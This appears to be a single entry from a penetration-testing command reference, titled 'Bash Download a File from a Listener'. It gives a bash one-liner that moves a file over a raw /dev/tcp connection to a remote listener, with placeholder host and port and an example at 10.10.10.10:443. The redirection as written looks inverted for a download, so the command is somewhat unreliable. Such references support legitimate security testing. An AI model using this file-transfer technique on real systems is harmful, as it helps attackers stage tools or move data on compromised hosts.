---
id: 42fb5a72-001f-4d64-984c-4791a49ea4a3
name: Bash Download a File from a Listener
type: command
executor: bash
data: cat > /dev/tcp/$_TARGET_IP/$_TARGET_PORT > $_FILENAME
output: cat > /dev/tcp/10.10.10.10/443 > foo
created_at: '2019-10-29T22:25:12.738629+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[CAT]]'
---

# Bash Download a File from a Listener

```bash
cat > /dev/tcp/$_TARGET_IP/$_TARGET_PORT > $_FILENAME
```

## Expected Output

```
cat > /dev/tcp/10.10.10.10/443 > foo
```


